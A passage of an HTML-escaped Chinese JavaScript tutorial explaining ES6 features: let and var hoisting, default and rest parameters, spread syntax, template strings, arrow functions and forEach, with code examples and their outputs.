&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;t&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;t&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;t&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// Cannot access &amp;#39;t&amp;#39; before initialization
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;t&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;t&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// t is not defined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;t1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;t1&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;t1&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// 2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;t1&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;t1&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// undefined
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;PS：变量提升(声明提升)：函数声明和变量声明总是会被解释器悄悄地被&amp;quot;提升&amp;quot;到方法体的最顶部。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// 变量 x 设置为 5
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// 声明 x
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;实际上，上述代码等于下述代码，在运行时，x 的的声明被提升到最顶部&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// 声明 x
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// 变量 x 设置为 5
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要注意的是，JavaScript 只有声明的变量会提升，初始化的不会。如下述实例中的 y 便输出了 undefined，这是因为变量声明 var y 提升了，但是其初始化 y = 7并不会提升，所以 y 是一个未定义的变量。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;y&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// undefined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;y&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// 初始化 y
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述代码等于&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;y&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;y&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;y&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;let 解决了诸如下述代码的问题&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;setTimeout&lt;/span&gt;(() =&amp;gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;)
  })
} &lt;span style=&#34;color:#75715e&#34;&gt;// 5 5 5 5 5 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;setTimeout&lt;/span&gt;(() =&amp;gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;)
  })
} &lt;span style=&#34;color:#75715e&#34;&gt;// 0 1 2 3 4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;setTimeout 的使用，使得 i 的输出延迟，又因为 var 是函数作用域，会变量提升，所以上述 var 的代码类似于&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;setTimeout&lt;/span&gt;(() =&amp;gt; {})
} 
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 5 5 5 5 5 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;而由于 let 是块作用域，不会变量提升，所谓 let 的值仅作用于使用中括号&lt;code&gt;{}&lt;/code&gt;包含的区域，如&lt;code&gt;for，while，if&lt;/code&gt;语句，因此不会出现如 var 那样的问题&lt;/p&gt;
&lt;h2 id=&#34;2默认参数&#34;&gt;2.默认参数&lt;/h2&gt;
&lt;p&gt;在 ES6 后，用户可以为函数设置默认参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ABC&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;) {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;)
}
&lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;() &lt;span style=&#34;color:#75715e&#34;&gt;// ABC 18
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ABCD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// ABCD 22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3扩展运算符-&#34;&gt;3.扩展运算符： &amp;hellip;&lt;/h2&gt;
&lt;p&gt;对象中的扩展运算符&lt;code&gt;...&lt;/code&gt;用于取出参数对象中的所有可遍历属性，拷贝到当前对象之中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [...&lt;span style=&#34;color:#a6e22e&#34;&gt;arr1&lt;/span&gt;, ...&lt;span style=&#34;color:#a6e22e&#34;&gt;arr2&lt;/span&gt;, ...&lt;span style=&#34;color:#a6e22e&#34;&gt;arr3&lt;/span&gt;]
[
  &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,
  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
]
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arrs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [...&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;, ...[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4剩余参数&#34;&gt;4.剩余参数&lt;/h2&gt;
&lt;p&gt;剩余参数语法允许我们将一个不定数量的参数表示为一个数组。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, ...&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;) {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;)
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;)
}
&lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ABCD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// ABCD [ 1, 2 ]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ABCD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// ABCD [ 1, 2, 3, 4, 5 ]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5模板字符串&#34;&gt;5.模板字符串&lt;/h2&gt;
&lt;p&gt;ES6 支持用户使用反引号创建字符串，所创建的字符串会使用&lt;code&gt;${}&lt;/code&gt;进行格式化输入&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ABCD&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;22&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;今年&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;岁啦`&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// ABCD今年22岁啦
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7箭头函数&#34;&gt;7.箭头函数&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; () =&amp;gt; {}

&lt;span style=&#34;color:#75715e&#34;&gt;// 如果只有一个参数，可以省略括号
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; =&amp;gt; {}

&lt;span style=&#34;color:#75715e&#34;&gt;// 如果函数体里只有一句return
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; =&amp;gt; {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;
}
&lt;span style=&#34;color:#75715e&#34;&gt;// 可简写为
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; =&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// 如果返回的是对象
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; =&amp;gt; ({ &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; })
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;普通函数和箭头函数的区别：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;箭头函数不可作为构造函数，不能使用 new&lt;/li&gt;
&lt;li&gt;箭头函数没有自己的 this，箭头函数里的 this 执行函数外&lt;/li&gt;
&lt;li&gt;箭头函数没有 arguments 对象&lt;/li&gt;
&lt;li&gt;箭头函数没有原型对象&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;8arrayprototypeforeach&#34;&gt;8.Array.prototype.forEach&lt;/h2&gt;
&lt;p&gt;数组遍历&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;eachArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;]

&lt;span style=&#34;color:#75715e&#34;&gt;// 三个参数：遍历项 索引 数组本身
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 配合箭头函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;eachArr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;forEach&lt;/span&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;) =&amp;gt; {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;)
})
&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; [ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; ]
